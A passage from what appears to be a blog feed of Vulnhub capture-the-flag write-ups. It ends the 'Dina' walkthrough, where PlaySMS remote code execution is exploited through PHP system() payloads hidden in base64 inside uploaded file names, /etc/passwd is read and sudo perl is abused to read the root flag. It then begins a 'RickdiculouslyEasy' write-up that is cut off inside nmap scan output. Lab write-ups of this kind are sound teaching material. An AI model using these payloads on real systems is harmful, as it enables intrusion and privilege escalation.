Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; backup.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 336


Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
ERROR: Wrong password : backup-cred.mp3

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here’s the content of &lt;strong&gt;robots.txt&lt;/strong&gt;, makes it better to scan one by one.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;User-agent: *
Disallow: /ange1
Disallow: /angel1
Disallow: /nothing
Disallow: /tmp
Disallow: /uploads&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;While every other directory is empty, there is a hidden comment in one called &lt;strong&gt;/nothing&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 NOT FOUND&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;NOT FOUND&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;go back&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;List of passwords, which we can now use to extract the contents of the backup. Luckily, first one already works - &lt;strong&gt;freedom&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# 7z x backup.zip

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-2410M CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206A7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 336 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: backup.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; backup.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 336


Would you like to replace the existing file:
  Path:     ./backup-cred.mp3
  Size:     0 bytes
  Modified: 2017-10-17 08:27:49
with the file from archive:
  Path:     backup-cred.mp3
  Size:     176 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Modified: 2017-10-17 08:27:49
? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Y&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;es / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;o / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;lways / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;kip all / A&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;to rename all / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Q&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;uit? Y


Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
Everything is Ok      

Size:       176
Compressed: 336&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can take a closer look at the file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file backup-cred.mp3
backup-cred.mp3: ASCII text
root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;backup-cred.mp3

I am not toooo smart &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: &lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;


url : /SecreTSMSgatwayLogin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great! As simple as it is, we get another clue. Let’s take a look at the provided directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dina/secret-sms.png&quot; alt=&quot;Secret SMS&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we already have a username, the best way to get into the website is to try passwords from the previously provided list. This time it’s &lt;strong&gt;diana&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dina/secret-sms-logged.png&quot; alt=&quot;Secret SMS Logged&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And after doing a little bit of enumeration, I’ve found exploit available for this service. &lt;a href=&quot;https://www.exploit-db.com/exploits/42003/&quot; title=&quot;PlaySMS Remote Code Execution&quot;&gt;PlaySMS Remote Code Execution&lt;/a&gt;, which we can use to attack our target.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.5/SecreTSMSgatwayLogin/index.php?app=main&amp;amp;inc=feature_sendfromfile&amp;amp;op=list&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In order to run commands, we have to create a file with &lt;strong&gt;php&lt;/strong&gt; command in title, just like this example.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;touch &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system('uname -a'); dia();?&amp;gt;.php&quot;&lt;/span&gt;
Uploaded file: Linux Dina 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s working! But there’s one problem - names of our files cannot contain &lt;strong&gt;/&lt;/strong&gt; characters, as they’re restriced by the filesystem. One workaround would be to encode the command with &lt;strong&gt;base64&lt;/strong&gt; and then decode the string through php function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cat /etc/passwd&quot;&lt;/span&gt; | base64
&lt;span class=&quot;nv&quot;&gt;Y2F0IC9ldGMvcGFzc3dkCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
touch &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(base64_decode('Y2F0IC9ldGMvcGFzc3dkCg==')); dia();?&amp;gt;.php&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it work?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
touhid:x:1000:1000:touhid,,,:/home/touhid:/bin/bash
mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yes! Now we have to find a way to get to the flag. From numerous times, I remember to start from easiest things, which is checking &lt;strong&gt;sudo -l&lt;/strong&gt; command.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Uploaded file: Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on this host:
    env_reset,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User www-data may run the following commands on this host:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmm, we can run &lt;strong&gt;perl&lt;/strong&gt; commands with root permissions. Let’s try to use it and read the contents of the flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudo perl-e 'exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat /root/flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)'&quot;&lt;/span&gt; | base64
&lt;span class=&quot;nv&quot;&gt;c3VkbyBwZXJsLWUgJ2V4ZWMoImNhdCAvcm9vdC9mbGFnLnR4dCIpJwo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now it’s time to upload it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;base64_decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'c3VkbyBwZXJsIC1lICdleGVjKCJjYXQgL3Jvb3QvZmxhZy50eHQiKScK'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; dia&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;.php
Uploaded file: ________                                                _________
&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_______&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------___&lt;/span&gt;       ___         ____----------/_________/
    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;______&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\\\&lt;/span&gt;   //_ _ &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;    //////-------/________/
        &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_____&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; ~|~ &lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;//------/________/
            &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;____&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt; //----/_____/
                 &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;-&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;/____/
                       &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/  &lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;_/
                          |  -&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  -  &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;


root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....


CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Our goal was to get the flag, so the job is done here, but reverse shell would be very easy to implement from this step.&lt;/p&gt;
</description>
        <pubDate>Sat, 18 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-dina/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-dina/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Rickdiculously Easy 1</title>
        <description>&lt;p&gt;With some time between lectures, I decided to try out some new machines from Vulnhub - in particular the one called &lt;strong&gt;RickdiculouslyEasy&lt;/strong&gt; as it seems to be really fun.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This is a fedora server vm, created with virtualbox.

It is a very simple Rick and Morty themed boot to root.

There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.

It's designed to be a beginner ctf, if you're new to pen testing, check it out!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/luke,562/&quot;&gt;&lt;b&gt;Luke&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://download.vulnhub.com/rickdiculouslyeasy/RickdiculouslyEasy.zip&quot;&gt;&lt;b&gt;RickdiculouslyEasy&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;write-up&quot;&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: Kali Linux &lt;strong&gt;10.0.2.4&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Victim: RickdiculouslyEasy &lt;strong&gt;10.0.2.15&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As always let’s start by scanning the machine using &lt;strong&gt;nmap&lt;/strong&gt;. This time I’m going to let it run a little longer, as I know that there are often hidden ports outside the default port range of nmap.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.15

Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-11-01 05:24 EDT
NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:24
Completed NSE at 05:24, 0.00s elapsed
Initiating NSE at 05:24
Completed NSE at 05:24, 0.00s elapsed
Initiating ARP Ping Scan at 05:24
Scanning 10.0.2.15 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 05:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 05:24
Completed Parallel DNS resolution of 1 host. at 05:24, 0.01s elapsed
Initiating SYN Stealth Scan at 05:24
Scanning 10.0.2.15 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 22/tcp on 10.0.2.15
Discovered open port 21/tcp on 10.0.2.15
Discovered open port 80/tcp on 10.0.2.15
Discovered open port 60000/tcp on 10.0.2.15
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15 from 5 to 10 due to 23 out of 57 dropped probes since last increase.
SYN Stealth Scan Timing: About 11.24% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:05 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 9090/tcp on 10.0.2.15
SYN Stealth Scan Timing: About 13.29% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:38 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 15.35% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:22 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 17.42% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:34 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Warning: 10.0.2.15 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
SYN Stealth Scan Timing: About 19.23% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:34 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 20.90% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:25 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 25.49% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:12:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 41.68% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:21 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 13337/tcp on 10.0.2.15
SYN Stealth Scan Timing: About 49.01% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:22 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 55.69% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:19 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 61.36% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:16 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 66.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 72.09% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:05 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 77.51% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:57 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 82.81% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:49 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 88.12% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 93.19% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:32 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 22222/tcp on 10.0.2.15
Completed SYN Stealth Scan at 05:50, 1569.31s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 05:50
Scanning 7 services on 10.0.2.15
Completed Service scan at 05:50, 11.01s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.15&lt;/span&gt;
NSE: Script scanning 10.0.2.15.
Initiating NSE at 05:50
NSE: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 05:51, 30.28s elapsed
Initiating NSE at 05:51
Completed NSE at 05:51, 1.02s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00081s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0              42 Aug 22 05:10 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
| fingerprint-strings:
